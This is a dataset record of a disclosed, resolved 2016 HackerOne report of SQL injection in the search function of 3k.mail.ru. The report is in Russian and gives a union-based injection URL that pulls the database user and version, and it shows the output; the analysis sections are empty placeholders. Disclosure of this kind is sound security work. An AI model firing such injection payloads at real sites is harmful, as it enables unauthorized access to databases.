---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '116508'
original_report_id: '116508'
title: '[3k.mail.ru] SQL Injection'
weakness: SQL Injection
team_handle: mailru
created_at: '2016-02-15T06:19:52.494Z'
disclosed_at: '2016-02-24T10:45:25.779Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- sql-injection
---

# [3k.mail.ru] SQL Injection

## Metadata

- HackerOne Report ID: 116508
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2016-02-24T10:45:25.779Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Добрый день.  Функция поиска уязвимо к атаке SQL Injection. Вектор атаки - Union Based

PoC. 

http://3k.mail.ru/info/library/index.php?obj=cat&id=212&searchST='+and+0+union+select+1,2,concat_ws(0x3a,user(),version()),4,5,6,7-- a

Вывод на странице:  master3k@localhost:5.0.90-log

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
